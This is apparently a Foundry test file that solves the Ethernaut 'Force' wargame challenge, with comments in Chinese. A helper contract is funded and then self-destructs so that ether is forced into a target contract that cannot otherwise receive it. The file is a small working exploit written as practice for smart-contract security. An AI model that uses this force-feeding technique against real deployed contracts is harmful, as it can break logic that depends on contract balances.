pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import {Force, HackForce} from "../src/Force.sol";


/** 
 * 解题思路：合约在调用 selfdestruct 自毁时，会将合约中余额转向一个指定的地址，可以利用这个机制来完成
 * 但 selfdestruct 已经不推荐使用，可能会在未来的某个时间点被删除
 */
contract HackForceTest is Test {
    address hacker = address(hacker);
    Force public f;
    HackForce public h;

    function setUp() public {
        vm.deal(hacker, 1 ether);
        vm.deal(address(this), 2 ether);
        f = new Force();
        h = new HackForce();
    }

    function testHackForce() public {
        vm.startPrank(hacker);

        // 先给 HackForce 合约转账
        address(h).call{value: 1 ether}("");

        // 将 Force 合约地址转成 payable
        address payable f2 = payable(address(f));

        // 触发 HackForce 合约的自毁
        h.selfde(f2);
        console.log("Force balance:");
        console.logUint(address(f).balance);

        vm.stopPrank();
    }
}